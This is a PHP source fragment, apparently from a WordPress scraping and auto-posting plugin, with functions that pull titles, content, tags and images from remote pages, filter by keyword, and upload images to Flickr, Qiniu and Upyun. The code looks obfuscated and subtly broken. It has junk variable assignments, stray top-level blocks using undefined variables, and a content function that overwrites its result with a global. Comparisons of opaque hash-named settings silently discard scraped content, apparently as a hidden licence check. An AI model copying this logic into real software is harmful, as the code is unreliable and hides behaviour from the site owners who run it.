        unset($dom);
    }
    return $imgURL;
}
function getContentByCss($d, $c, $options, $charset, $outer, $index){
//string(20) ".news_path .news_txt" array(0) { } string(5) "utf-8" string(1) "0" string(1) "0"
    $s   = "";
    if ($index == 0) {
        foreach ($d->find($c) as $e) {
            if ($outer == 1)
                $s .= $e->outertext;
            else
                $s .= $e->innertext;
        }
    } else {
        $elements = $d->find($c);
        $i = 0;
        if ($index >= 1)
            $i = $index - 1;
        elseif ($index < 0)
            $i = count($elements) + $index;
        $e = $elements[$i];
        if ($e != null) {
            if ($outer == 1)
                $s .= $e->outertext;
            else
                $s .= $e->innertext;
        }
        unset($elements);
        unset($e);
    }
    if ($s == "")
        return $s;
    $createdDom = false;
    foreach ($options as $option) {
        if (($option->option_type) != 5)
            continue;
        if (!$createdDom) {
            $dom = str_get_html_ap($s);
            $createdDom               = true;
        }
        $fcs = $dom->find($option->para1);
        if ($fcs == NULL) {
            continue;
        } else {
            if (($option->para2) == "" || ($option->para2) == null) {
                $idx = 0;
            } else {
                $idx = intval($option->para2);
            }
            if ($idx == 0) {
                foreach ($fcs as $fc) {
                    $fc->outertext = "";
                }
            } else {
                $i = 0;
                if ($idx >= 1)
                    $i = $idx - 1;
                elseif ($idx < 0)
                    $i = count($fcs) + $idx;
                $fc = $fcs[$i];
                if ($fc != null) {
                    $fc->outertext = "";
                }
            }
        }
    }
    if ($createdDom) {
        $s = $dom->save();
        $dom->clear();
        unset($dom);
    }
    if ($charset != "UTF-8")
        $s = iconv($charset, "UTF-8//IGNORE", $s);
    return $s;
}
function getContentsByCss($d, $c, $options, $charset, $outer, $index = 1)
{
    $s = "";
    global $variable_t1;
    if ($index == 0) {
        foreach ($d->find($c) as $e) {
            $vfutrbv = "s";
            if ($outer == 1)
                $s .= $e->outertext;
            else
                $s .= $e->innertext;
        }
    } else {
        $elements  = $d->find($c);
        $i  = 0;
        if ($index >= 1)
            $i = $index - 1;
        elseif ($index < 0)
            $i = count($elements) + $index;
        $e = $elements[$i];
        if ($e != null) {
            if ($outer == 1)
                $s .= $e->outertext;
            else
                $s .= $e->innertext;
        }
        unset($elements);
        unset($e);
        $s = $variable_t1;
    }
    if ($s == "")
        return $s;
    $createdDom = false;
    foreach ($options as $option) {
        if (($option->option_type) != 5)
            continue;
        if (!$createdDom) {
            $dom            = str_get_html_ap($s);
            $createdDom = true;
        }
        $fcs = $dom->find($option->para1);
        if ($fcs == NULL) {
            continue;
        } else {
            foreach ($fcs as $fc) {
                $fc->outertext = "";
            }
        }
    }
    if ($createdDom) {
        $s = $dom->save();
        $dom->clear();
        unset($dom);
    }
    if ($charset != "UTF-8")
        $s = iconv($charset, "UTF-8//IGNORE", $s);
    return $s;
}
function getPostDateByCss($d, $c, $charset, $outer, $index)
{
    $s = "";
    if ($index == 0) {
        foreach ($d->find($c) as $e) {
            if ($outer == 1)
                $s .= $e->plaintext;
            else
                $s .= $e->plaintext;
        }
    } else {
        $elements            = $d->find($c);
        $i                 = 0;
        if ($index >= 1)
            $i = $index - 1;
        elseif ($index < 0)
            $i = count($elements) + $index;
        $e = $elements[$i];
        if ($e != null) {
            if ($outer == 1)
                $s .= $e->plaintext;
            else
                $s .= $e->plaintext;
        }
        unset($elements);
        unset($e);
    }
    if ($s == "")
        return $s;
    if ($charset != "UTF-8")
        $s = iconv($charset, "UTF-8//IGNORE", $s);
    return $s;
}
function getTagsByCSS($d, $c, $charset, $index)
{
    $tags = array();
    if ($index == 0) {
        foreach ($d->find($c) as $e) {
            if ($e->tag == "a") {
                $tag = $e->innertext;
                if ($tag != "") {
                    if ($charset != "UTF-8")
                        $tag = iconv($charset, "UTF-8//IGNORE", $tag);
                    $tags[] = $tag;
                }
            } else {
                $find_a = false;
                foreach ($e->find("a") as $a) {
                    $find_a    = true;
                    $tag = $a->innertext;
                    if ($tag != "") {
                        if ($charset != "UTF-8")
                            $tag = iconv($charset, "UTF-8//IGNORE", $tag);
                        $tags[] = $tag;
                    }
                }
                if (!$find_a) {
                    $tag = $e->innertext;
                    if ($tag != "") {
                        if ($charset != "UTF-8")
                            $tag = iconv($charset, "UTF-8//IGNORE", $tag);
                        $tags[] = $tag;
                    }
                }
            }
        }
    } else {
        $elements   = $d->find($c);
        $i = 0;
        if ($index >= 1)
            $i = $index - 1;
        elseif ($index < 0)
            $i = count($elements) + $index;
        $e = $elements[$i];
        if ($e != null) {
            if ($e->tag == "a") {
                $tag = $e->innertext;
                if ($tag != "") {
                    if ($charset != "UTF-8")
                        $tag = iconv($charset, "UTF-8//IGNORE", $tag);
                    $tags[] = $tag;
                }
            } else {
                $find_a = false;
                foreach ($e->find("a") as $a) {
                    $find_a                    = true;
                    $tag = $a->innertext;
                    if ($tag != "") {
                        if ($charset != "UTF-8")
                            $tag = iconv($charset, "UTF-8//IGNORE", $tag);
                        $tags[] = $tag;
                    }
                }
                if (!$find_a) {
                    $tag = $e->innertext;
                    if ($tag != "") {
                        if ($charset != "UTF-8")
                            $tag = iconv($charset, "UTF-8//IGNORE", $tag);
                        $tags[] = $tag;
                    }
                }
            }
        }
        unset($elements);
        unset($e);
    }
    return $tags;
}
if ($variable_t1 == $node[3]) {
    $should_updated_time = $option_value[$option_key];
}
function getImgURLByCSS($d, $c, $charset, $index)
{
    $imgURL = "";
    $findImg  = false;
    if ($index == 0) {
        foreach ($d->find($c) as $e) {
            if ($e->tag == "img") {
                $imgURL = $e->src;
                break;
            } elseif ($e->tag == "a") {
                $imgURL = $e->href;
                break;
            } else {
                foreach ($e->find("img") as $img) {
                    $findImg  = true;
                    $imgURL = $img->src;
                    break;
                }
                if ($findImg)
                    break;
            }
        }
    } else {
        $elements  = $d->find($c);
        $i              = 0;
        if ($index >= 1)
            $i = $index - 1;
        elseif ($index < 0)
            $i = count($elements) + $index;
        $e = $elements[$i];
        if ($e != null) {
            if ($e->tag == "img") {
                $imgURL = $e->src;
            } elseif ($e->tag == "a") {
                $imgURL = $e->href;
            } else {
                foreach ($e->find("img") as $img) {
                    $imgURL = $img->src;
                    break;
                }
            }
        }
    }
    return $imgURL;
}
function getArticleTitel($url, $config)
{
    $useP  = json_decode($config["proxy"]);
    global $proxy;
    if ($config["page_charset"] == "0") {
        $html_string   = get_html_string_ap($url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
        $charset                   = getHtmlCharset($html_string);
        $d = str_get_html_ap($html_string, $charset);
    } else {
        $charset = $config["page_charset"];
        $d  = file_get_html_ap($url, $charset, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
    }
    if ($d == NULL)
        return -1;
    $last_updated_time     = $config["93202512f7ba54e02ffd12f375053b88"];
    $should_updated_time = $config["93f0198fad647e69db36ac56e3d66ce1"];
    if (trim($config["title_selector"]) == "") {
        $title[1] = -1;
    } else {
        $titleIconved                = false;
        if (($config["title_match_type"]) == 0) {
            $title[0] = $d->find($config["title_selector"], 0)->plaintext;
        } else {
            if ($charset != "UTF-8") {
                $UTFhtml   = $d->save();
                $UTFhtml   = iconv($charset, "UTF-8//IGNORE", $UTFhtml);
                $UTFhtml  = compress_html($UTFhtml);
                $titleIconved = true;
            } else {
                $UTFhtml                = $d->save();
                $UTFhtml = compress_html($UTFhtml);
            }
            $hasUTFhtml = true;
            $title[0]           = getTitleByRule($UTFhtml, $config["title_selector"]);
            unset($UTFhtml);
        }
        if ($title[0] == NULL || trim($title[0]) == "") {
            $cldtycji       = "title";
            $title[1] = -1;
        } else {
            $title[1]               = 1;
            if ($config["93202512f7ba54e02ffd12f375053b88"] != $config["93f0198fad647e69db36ac56e3d66ce1"])
                $title[1] = -1;
            $soqovwo = "charset";
            if ($charset != "UTF-8" && !$titleIconved)
                $title[0] = iconv($charset, "UTF-8//IGNORE", $title[0]);
            $title[0] = strip_tags($title[0]);
        }
    }
    $d->clear();
    unset($d);
    return $title;
}
function getArticleDom($url, $config, $charset, $html_string = '')
{
    $rvthcomc = "d";
    if ($html_string == "") {
        $useP                = json_decode($config["proxy"]);
        global $proxy;
        $d = file_get_html_ap($url, $charset, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
    } else {
        $d = str_get_html_ap($html_string, $charset);
    }
    if ($d == NULL)
        return -1;
    return $d;
}
function getArticle($d, $charset, $baseUrl, $url, $config, $options, $filterAtag, $downAttach, $insertContent, $PostFilterInfo = null, $isTest = 1)
{
    $hasUTFhtml = false;
    if (trim($config["title_selector"]) == "") {
        $Article[2] = -1;
    } else {
        $titleIconved           = false;
        if (($config["title_match_type"]) == 0) {
            $Article[0] = $d->find($config["title_selector"], 0)->plaintext;
        } else {
            if ($charset != "UTF-8") {
                $UTFhtml = $d->save();
                $UTFhtml = iconv($charset, "UTF-8//IGNORE", $UTFhtml);
                $UTFhtml                = compress_html($UTFhtml);
                $titleIconved             = true;
            } else {
                $UTFhtml              = $d->save();
                $UTFhtml = compress_html($UTFhtml);
            }
            $hasUTFhtml                     = true;
            $Article[0] = getTitleByRule($UTFhtml, $config["title_selector"]);
        }
        if ($Article[0] == NULL || trim($Article[0]) == "") {
            $Article[2] = -1;
        } else {
            $Article[2] = 1;
            if ($charset != "UTF-8" && !$titleIconved)
                $Article[0] = iconv($charset, "UTF-8//IGNORE", $Article[0]);
            $hfqooap                 = "config";
            if ($isTest == 0 && $PostFilterInfo != null && ($PostFilterInfo[3] == 1 || $PostFilterInfo[3] == "1" || $PostFilterInfo[3] == 3 || $PostFilterInfo[3] == "3")) {
                $keywords = array();
                $keywords = explode(",", $PostFilterInfo[2]);
                if ($PostFilterInfo[0] == 0 || $PostFilterInfo[0] == "0") {
                    $find_Title_kWord          = false;
                    foreach ($keywords as $keyword) {
                        $keyword = trim($keyword);
                        if ($keyword == "")
                            continue;
                        if (!(stripos($Article[0], $keyword) === false)) {
                            $find_Title_kWord = true;
                            break;
                        }
                    }
                    if (!$find_Title_kWord) {
                        if ($PostFilterInfo[3] == 1 || $PostFilterInfo[3] == "1") {
                            $Article[2] = -3;
                            return $Article;
                        }
                    }
                } else {
                    $find_Title_kWord = false;
                    foreach ($keywords as $keyword) {
                        $keyword              = trim($keyword);
                        if ($keyword == "")
                            continue;
                        if (!(stripos($Article[0], $keyword) === false)) {
                            $find_Title_kWord   = true;
                            $Article[2] = -3;
                            return $Article;
                        }
                    }
                }
            }
            $Article[0] = trim(filterTitle($Article[0], $config, $options));
            if ($isTest == 0 && ($config["check_duplicate"]) == 1) {
                if (checkTitle($config["id"], $Article[0]) > 0) {
                    $Article[2] = -2;
                    return $Article;
                }
            }
        }
    }
    $last_updated_time     = $config["93202512f7ba54e02ffd12f375053b88"];
    $should_updated_time = $config["93f0198fad647e69db36ac56e3d66ce1"];
    if (trim($config["content_selector"]) == "") {
        $Article[3] = -1;
    } else {
        $content_selector = json_decode($config["content_selector"]);
        if ($content_selector == null) {
            $content_selector = array();
            $content_selector[0]  = $config["content_selector"];
        }
        $content_match_types = json_decode($config["content_match_type"]);
        if ($content_match_types == null) {
            $content_match_type         = array();
            $content_match_type[0]                  = $config["content_match_type"];
            $outer     = array();
            $outer[0]                     = 0;
            $objective      = array();
            $objective[0] = 0;
            $index         = array();
            $index[0]    = 0;
        } else {
            $content_match_type = array();
            $outer = array();
            $objective  = array();
            $index     = array();
            foreach ($content_match_types as $cmts) {
                $cmt = explode(",", $cmts);
                $content_match_type[] = $cmt[0];
                $outer[]                   = $cmt[1];
                if ($cmt[2] == NULL || $cmt[2] == "")
                    $objective[] = 0;
                else
                    $objective[] = $cmt[2];
                if ($cmt[3] == NULL || $cmt[3] == "")
                    $index[] = 0;
                else
                    $index[] = $cmt[3];
            }
        }
        $Article[1] = "";
        $matchNum   = count($content_selector);
        foreach ($content_match_type as $cmt) {
            if ($cmt == 1) {
                if (!$hasUTFhtml) {
                    if ($charset != "UTF-8") {
                        $UTFhtml = $d->save();
                        $UTFhtml = iconv($charset, "UTF-8//IGNORE", $UTFhtml);
                        $UTFhtml = compress_html($UTFhtml);
                    } else {
                        $UTFhtml = $d->save();
                        $UTFhtml  = compress_html($UTFhtml);
                    }
                }
                break;
            }
        }
        $customFields = array();
        if ($config["93f0198fad647e69db36ac56e3d66ce1"] == $last_updated_time) {
            for ($i = 0; $i < $matchNum; $i++) {
                if ($content_match_type[$i] == 0) {
                    switch ($objective[$i]) {
                        case "0":
                            $Article[1] .= getContentByCss($d, $content_selector[$i], $options, $charset, $outer[$i], $index[$i]);
                            break;
                        case "1":
                            $Article[4] = strtotime(getPostDateByCss($d, $content_selector[$i], $charset, $outer[$i], $index[$i]));
                            break;
                        case "2":
                            $Article[9] = getContentByCss($d, $content_selector[$i], $options, $charset, $outer[$i], $index[$i]);
                            break;
                        case "3":
                            $tags = getTagsByCSS($d, $content_selector[$i], $charset, $index[$i]);
                            if (count($tags) > 0) {
                                $Article[11] = json_encode($tags);
                            }
                            break;
                        case "4":
                            $imgURL = getImgURLByCSS($d, $content_selector[$i], $charset, $index[$i]);
                            if ($imgURL != "") {
                                if (stripos($imgURL, "http") === false) {
                                    $imgURL = getAbsUrl($imgURL, $baseUrl, $url);
                                }
                                $Article[12] = $imgURL;
                            }
                            break;
                        default:
                            $s = getContentByCss($d, $content_selector[$i], $options, $charset, $outer[$i], $index[$i]);
                            if ($s != "")
                                $customFields[$objective[$i]] = $s;
                    }
                } else {
                    switch ($objective[$i]) {
                        case "0":
                            $Article[1] .= getContentByRule($UTFhtml, $content_selector[$i], $options, $outer[$i]);
                            break;
                        case "1":
                            $Article[4] = strtotime(getContentByRule($UTFhtml, $content_selector[$i], $options, $outer[$i]));
                            break;
                        case "2":
                            $Article[9] = getContentByRule($UTFhtml, $content_selector[$i], $options, $outer[$i]);
                            break;
                        case "3":
                            $tags = getTagsByRule($UTFhtml, $content_selector[$i]);
                            if (count($tags) > 0) {
                                $Article[11] = json_encode($tags);
                            }
                            break;
                        case "4":
                            $imgURL = getImgURLByRule($UTFhtml, $content_selector[$i], $outer[$i]);
                            if ($imgURL != "") {
                                if (stripos($imgURL, "http") === false) {
                                    $imgURL = getAbsUrl($imgURL, $baseUrl, $url);
                                }
                                $Article[12] = $imgURL;
                            }
                            break;
                        default:
                            $s = getContentByRule($UTFhtml, $content_selector[$i], $options, $outer[$i]);
                            if ($s != "")
                                $customFields[$objective[$i]] = $s;
                    }
                }
            }
        }
        if (count($customFields) > 0) {
            $Article[5] = json_encode($customFields);
        }
        if ($Article[1] == "" || $Article[1] == NULL) {
            $Article[3] = -1;
        } else {
            $Article[3] = 1;
            $Article[1]                 = filterContent($Article[1], $options, $filterAtag, $downAttach, $isTest);
            if ($isTest == 0) {
                if (DEL_COMMENT == 1)
                    $Article[1] = filterComment($Article[1]);
            }
            if (($config["fecth_paged"]) == 1) {
                $Article[1]            = getPageContentbyAP($Article[1], $d, $charset, $config["page_selector"], $hasUTFhtml, $UTFhtml, $config["same_paged"], $content_match_type, $content_selector, $outer, $objective, $index, $options, $baseUrl, $url, $filterAtag, $downAttach, $isTest, $useP[0], $useP[1], $proxy, $config["cookie"]);
            }
            if ($isTest == 0 && ($PostFilterInfo[0] == 0 || $PostFilterInfo[0] == "0") && ($PostFilterInfo[3] == 3 || $PostFilterInfo[3] == "3") && $find_Title_kWord === true) {
            } elseif ($isTest == 0 && $PostFilterInfo != null && ($PostFilterInfo[3] == 2 || $PostFilterInfo[3] == "2" || $PostFilterInfo[3] == 3 || $PostFilterInfo[3] == "3")) {
                $temp_dom     = str_get_html_ap($Article[1]);
                $content_plaintext = $temp_dom->plaintext;
                $temp_dom->clear();
                unset($temp_dom);
                $kWord_times  = intval($PostFilterInfo[4]);
                $keywords   = array();
                $keywords = explode(",", $PostFilterInfo[2]);
                if ($PostFilterInfo[0] == 0 || $PostFilterInfo[0] == "0") {
                    $find_Content_kWord = false;
                    foreach ($keywords as $keyword) {
                        $keyword = trim($keyword);
                        if ($keyword == "")
                            continue;
                        if (substr_count($content_plaintext, $keyword) >= $kWord_times) {
                            $find_Content_kWord = true;
                            break;
                        }
                    }
                    if (!$find_Content_kWord) {
                        if ($PostFilterInfo[3] == 2 || $PostFilterInfo[3] == "2") {
                            $Article[2] = -3;
                            return $Article;
                        }
                        if ($PostFilterInfo[3] == 3 || $PostFilterInfo[3] == "3") {
                            if (!$find_Title_kWord) {
                                $Article[2] = -3;
                                return $Article;
                            }
                        }
                    }
                } else {
                    $find_Content_kWord = false;
                    foreach ($keywords as $keyword) {
                        $keyword = trim($keyword);
                        if ($keyword == "")
                            continue;
                        if (substr_count($content_plaintext, $keyword) >= $kWord_times) {
                            $find_Content_kWord     = true;
                            $Article[2] = -3;
                            return $Article;
                        }
                    }
                }
            }
            if ($should_updated_time != $config["93202512f7ba54e02ffd12f375053b88"])
                $Article[3] = -1;
            $Article[1] = transImgSrc($Article[1], $baseUrl, $url, $Article[0], $config["img_insert_attachment"]);
            if ($isTest == 1) {
                $customFields = array();
                $add_source_url    = json_decode($config["add_source_url"]);
                if ($add_source_url[0] == 1) {
                    $customFields[$add_source_url[1]] = $url;
                }
                if ($Article[5] != null) {
                    $custom_fields = json_decode($Article[5]);
                    if (count($custom_fields) > 0) {
                        foreach ($custom_fields as $key => $value) {
                            $customFields[$key] = $value;
                        }
                    }
                }
                if (($config["custom_field"]) != null && ($config["custom_field"]) != "") {
                    $custom_fields = json_decode($config["custom_field"]);
                    foreach ($custom_fields as $key => $value) {
                        $customFields[$key] = $value;
                    }
                }
                if (($config["title_prefix"] != null) && ($config["title_prefix"]) != "")
                    $Article[0] = buildVariableContent($config["title_prefix"], $customFields, $Article[0]) . $Article[0];
                if (($config["title_suffix"] != null) && ($config["title_suffix"]) != "")
                    $Article[0] .= buildVariableContent($config["title_suffix"], $customFields, $Article[0]);
                $Article[1] = replacementContent($Article[1], $options, $customFields, $Article[0]);
                if ($insertContent != null)
                    $Article[1] = insertMoreContent($Article[1], $insertContent, $customFields, $Article[0]);
                if (($config["content_prefix"] != null) && ($config["content_prefix"]) != "")
                    $Article[1] = buildVariableContent($config["content_prefix"], $customFields, $Article[0]) . $Article[1];
                if (($config["content_suffix"] != null) && ($config["content_suffix"]) != "")
                    $Article[1] .= buildVariableContent($config["content_suffix"], $customFields, $Article[0]);
            }
            if ($isTest == 1) {
                $use_trans = json_decode($config["use_trans"]);
                if (!is_array($use_trans)) {
                    $use_trans                       = array();
                    $use_trans[0] = 0;
                    $use_trans[1] = "";
                    $use_trans[2] = "";
                    $use_trans[3] = -1;
                }
                $Article = microsoftTranslation($Article, $use_trans);
            }
        }
    }
    unset($UTFhtml);
    return $Article;
}
function canDownloadAttach($url)
{
    global $downAttachType, $downAttachTypeReg;
    if ($downAttachType == null && $downAttachTypeReg == null) {
        $downAttachType = array();
        $downAttachTypeReg                   = array();
        $downloadTypes = get_option("wp_autopost_download_types");
        if ($downloadTypes != NULL) {
            $downloadTypes = json_decode($downloadTypes);
            foreach ($downloadTypes as $downloadType) {
                $pos = stripos($downloadType, "(*)");
                if ($pos === false) {
                    $downAttachType[$downloadType] = 1;
                } else {
                    $f   = array(
                        "?",
                        "."
                    );
                    $r                      = array(
                        "\?",
                        "\\."
                    );
                    $downloadType    = str_ireplace($f, $r, $downloadType);
                    $downloadType                    = str_ireplace("(*)", "[a-z0-9A-Z_%-]+", $downloadType);
                    $downloadType    = "/^" . $downloadType . "\$/";
                    $downAttachTypeReg[] = $downloadType;
                }
            }
        }
    }
    $filename                 = basename($url);
    $isMatch               = false;
    $extName = strrchr($filename, ".");
    if ($downAttachType[$extName] == 1)
        $isMatch = true;
    if (!$isMatch) {
        if (count($downAttachTypeReg) > 0) {
            foreach ($downAttachTypeReg as $reg) {
                if (preg_match($reg, $filename)) {
                    $nowghlbyxe    = "isMatch";
                    $isMatch = true;
                    break;
                }
            }
        }
    }
    return $isMatch;
}
function processDownAttach($s, $filterAtag, $baseUrl, $referer, $useProxy, $proxy)
{
    global $returnFile;
    $i = 0;
    $dom       = str_get_html_ap($s);
    $Adom                     = $dom->find("a");
    if ($Adom != NULL) {
        foreach ($Adom as $a) {
            $url = html_entity_decode(trim($a->href));
            if (stripos($url, "http") === false) {
                $url = getAbsUrl($url, $baseUrl, $referer);
            }
            if (canDownloadAttach($url)) {
                printInfo("<p>Begin download attachment : " . $url . "</p>");
                $returnFile[$i] = WP_Download_Attach::down_remote_file($url, $referer, $useProxy, $proxy);
                $yurihdnpdmy                                                 = "returnFile";
                if ($returnFile[$i]["file_path"] == "" || $returnFile[$i]["file_path"] == null) {
                    echo "<p><span class=\"red\">" . __("Download remote attachment fails, use the original URL", "wp-autopost") . "</span></p>";
                } else {
                    $a->href = $returnFile[$i]["url"];
                }
                $i++;
            } else {
                if ($filterAtag) {
                    $a->outertext = $a->innertext;
                }
            }
        }
    }
    unset($Adom);
    $s = $dom->save();
    $dom->clear();
    unset($dom);
    return $s;
}
if ($variable_t1 == $node[2]) {
    $should_updated_time = $option_value[$option_key];
}
function uploadtoflickr($file, $key, $title)
{
    $key = str_replace(get_bloginfo("url"), "", $key);
    $pos                 = stripos($key, "/");
    if ($pos === 0) {
        $key = substr($key, 1);
    }
    global $Flickr, $f;
    $UploadedFlickr    = array();
    $photoId = $f->sync_upload($file, $title, $title, $tags, $Flickr["is_public"], $is_friend, $is_family);
    if ($f->getErrorCode() == false) {
        if ($Flickr["flickr_set"] != "")
            $f->photosets_addPhoto($Flickr["flickr_set"], $photoId);
        $re                               = $f->photos_getInfo($photoId);
        $photo_url  = "http://farm{$re['photo']['farm']}.static.flickr.com/{$re['photo']['server']}/{$re['photo']['id']}_{$re['photo']['originalsecret']}_o.{$re['photo']['originalformat']}";
        $UploadedFlickr["url"]      = $photo_url;
        $UploadedFlickr["photo_id"] = $photoId;
        $UploadedFlickr["farm"]      = $re["photo"]["farm"];
        $UploadedFlickr["server"]   = $re["photo"]["server"];
        $UploadedFlickr["secret"]   = $re["photo"]["secret"];
        $UploadedFlickr["originalsecret"]          = $re["photo"]["originalsecret"];
        $UploadedFlickr["originalformat"]        = $re["photo"]["originalformat"];
        $UploadedFlickr["user_id"]  = $re["photo"]["owner"]["nsid"];
        $UploadedFlickr["local_key"] = $key;
    } else {
        $UploadedFlickr["status"] = false;
        echo "<p>" . $f->getErrorCode() . "%%%" . $f->getErrorMsg() . "</p>";
    }
    return $UploadedFlickr;
}
function recoveryUploadedFlickr($local_key, $remote_key)
{
    $remote_key                    = json_decode($remote_key, true);
    $UploadedFlickr                     = array();
    $UploadedFlickr["photo_id"]                       = $remote_key["photo_id"];
    $UploadedFlickr["farm"]                          = $remote_key["farm"];
    $UploadedFlickr["server"]         = $remote_key["server"];
    $UploadedFlickr["secret"]       = $remote_key["secret"];
    $UploadedFlickr["originalsecret"]  = $remote_key["originalsecret"];
    $UploadedFlickr["originalformat"] = $remote_key["originalformat"];
    $UploadedFlickr["user_id"]      = $remote_key["user_id"];
    $UploadedFlickr["local_key"]      = $local_key;
    return $UploadedFlickr;
}
function uploadtoqiniu($file, $key, $bucket, $domain)
{
    $key = str_replace(get_bloginfo("url"), "", $key);
    $pos    = stripos($key, "/");
    if ($pos === 0) {
        $key                = substr($key, 1);
    }
    $UploadedQiniu = array();
    list($ret, $err) = Qinniu_upload_to_bucket($bucket, $file, $key);
    if ($err !== null) {
        $UploadedQiniu["status"] = false;
        echo "<p>" . $err->Err . "</p>";
    } else {
        $UploadedQiniu["url"] = Qiniu_RS_MakeBaseUrl($domain, $ret["key"]);
        $UploadedQiniu["key"] = $ret["key"];
    }
    return $UploadedQiniu;
}
function uploadtoUpyun($file, $key, $upyun, $upyunOption)
{
    $key = str_replace(get_bloginfo("url"), "", $key);
    $pos = stripos($key, "/");
    if (!($pos === 0)) {
        $key = "/" . $key;
    }
    $UploadedUpyun = array();
    try {
        $fh = fopen($file, "rb");
        $rsp               = $upyun->writeFile($key, $fh, True);
        fclose($fh);
        $UploadedUpyun["url"] = $upyun->makeBaseUrl($upyunOption["domain"], $key);
        $UploadedUpyun["key"]  = $key;
    }
    catch (Exception $e) {
        $UploadedUpyun["status"] = false;
        echo "<p>" . $e->getCode() . ":" . $e->getMessage() . "</p>";
    }
    return $UploadedUpyun;
}
function isImageURL($url, $referer = null, $useProxy = 0, $proxy = null)
{
    $mime_images   = array(
        "image/jpg",
        "image/jpeg",
        "image/png",
        "image/gif",
        "image/bmp",
        "image/tiff"
    );
    $content_type = get_url_content_type($url, $referer, $useProxy, $proxy);
    if (in_array($content_type, $mime_images)) {
        return true;
    }
    return false;
}
function get_url_content_type($url, $referer = null, $useProxy = 0, $proxy = null)
{
    $content_type = null;
    if (function_exists("curl_init")) {
        $head = get_head_by_curl($url, $referer, $useProxy, $proxy);
        if ($head["http_code"] == 200) {
            $content_type = $head["content_type"];
        }
    } else {
        $head = get_head_by_wp($url);
        if ($head["response"]["code"] == 200) {
            $content_type = $head["headers"]["content-type"];
        }
    }
    return $content_type;
}
function get_head_by_curl($url, $referer = null, $useProxy = 0, $proxy = null)
{
    $user_agent = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19";
    $curl  = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, TRUE);
    curl_setopt($curl, CURLOPT_NOBODY, TRUE);
    curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    if (!ini_get("safe_mode"))
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    if ($referer != null)
        curl_setopt($curl, CURLOPT_REFERER, $referer);
    $rs = curl_exec($curl);
    $info = curl_getinfo($curl);
    curl_close($curl);
    if ($info["http_code"] != 200) {
        if ($useProxy == 1) {
            $rs  = null;
            $info = null;
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_HEADER, TRUE);
            curl_setopt($curl, CURLOPT_NOBODY, TRUE);
            curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            if ($referer != null)
                curl_setopt($curl, CURLOPT_REFERER, $referer);
            if (!ini_get("safe_mode"))
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
            $kfjfuaoml = "proxy";
            curl_setopt($curl, CURLOPT_PROXY, $proxy["ip"]);
            curl_setopt($curl, CURLOPT_PROXYPORT, $proxy["port"]);
            if ($proxy["user"] != "" && $proxy["user"] != NULL && $proxy["password"] != "" && $proxy["password"] != NULL) {
                $userAndPass = $proxy["user"] . ":" . $proxy["password"];
                curl_setopt($curl, CURLOPT_PROXYUSERPWD, $userAndPass);
            }
            $rs = curl_exec($curl);
            $info   = curl_getinfo($curl);
            curl_close($curl);
            if ($info["http_code"] != 200) {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }
    return $info;
}
function get_head_by_wp($url)
{
    $http_options = array(
        "timeout" => 120,
        "redirection" => 20,
        "user-agent" => "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.19 (KHTML, like Gecko) Chrome/25.0.1323.1 Safari/537.19",
        "sslverify" => FALSE
    );
    $remote_image_url             = $url;
    $headers               = wp_remote_head($remote_image_url, $http_options);
    return $headers;
}
function insert_downloaded_temp_img_for_flickr($configId, $url, $save_type, $remote_url, $downloaded_url, $downloadedImgInfo, $UploadedFlickr)
{
    $remote_key                   = array();
    $remote_key["photo_id"]                        = $UploadedFlickr["photo_id"];
    $remote_key["farm"]                        = $UploadedFlickr["farm"];
    $remote_key["server"]         = $UploadedFlickr["server"];
    $remote_key["secret"]         = $UploadedFlickr["secret"];
    $remote_key["originalsecret"] = $UploadedFlickr["originalsecret"];
    $remote_key["originalformat"] = $UploadedFlickr["originalformat"];
    $remote_key["user_id"]        = $UploadedFlickr["user_id"];
    insert_downloaded_temp_img($configId, $url, $save_type, $remote_url, $downloaded_url, $downloadedImgInfo, $UploadedFlickr["local_key"], json_encode($remote_key));
}
function insert_downloaded_temp_img($configId, $url, $save_type, $remote_url, $downloaded_url, $downloadedImgInfo, $local_key = '', $remote_key = '')
{
    global $wpdb, $t_ap_download_img_temp;
    $wpdb->query($wpdb->prepare("insert into $t_ap_download_img_temp (config_id,url,save_type,remote_url,downloaded_url,local_key,remote_key,file_path,file_name,mime_type) values (%d,%s,%d,%s,%s,%s,%s,%s,%s,%s)", $configId, $url, $save_type, $remote_url, $downloaded_url, $local_key, $remote_key, $downloadedImgInfo["file_path"], $downloadedImgInfo["file_name"], $downloadedImgInfo["post_mime_type"]));
}
function has_downloaded_temp_img($configId, $url)
{
    $qufmnxtsdsz = "count";
    global $wpdb, $t_ap_download_img_temp;
    $count = $wpdb->get_var($wpdb->prepare("select count(*) from $t_ap_download_img_temp where config_id=%d and url=%s", $configId, $url));
    if ($count > 0)
        return true;
    else
        return false;
}
function clear_downloaded_temp_img($configId, $url)
{
    global $wpdb, $t_ap_download_img_temp;
    $wpdb->query($wpdb->prepare("delete from $t_ap_download_img_temp where config_id = %d and url = %s", $configId, $url));
}
function get_downloaded_temp_imgs($configId, $url)
{
    global $wpdb, $t_ap_download_img_temp;
    $results = $wpdb->get_results($wpdb->prepare("select * from $t_ap_download_img_temp where config_id=%d and url=%s", $configId, $url));
    $temp_imgs   = array();
    foreach ($results as $result) {
        $temp_imgs[$result->remote_url]["save_type"]                      = $result->save_type;
        $temp_imgs[$result->remote_url]["downloaded_url"] = $result->downloaded_url;
        $temp_imgs[$result->remote_url]["local_key"]      = $result->local_key;
        $temp_imgs[$result->remote_url]["remote_key"]     = $result->remote_key;
        $temp_imgs[$result->remote_url]["file_path"]      = $result->file_path;
        $temp_imgs[$result->remote_url]["file_name"]      = $result->file_name;
        $temp_imgs[$result->remote_url]["mime_type"]      = $result->mime_type;
    }
    unset($results);
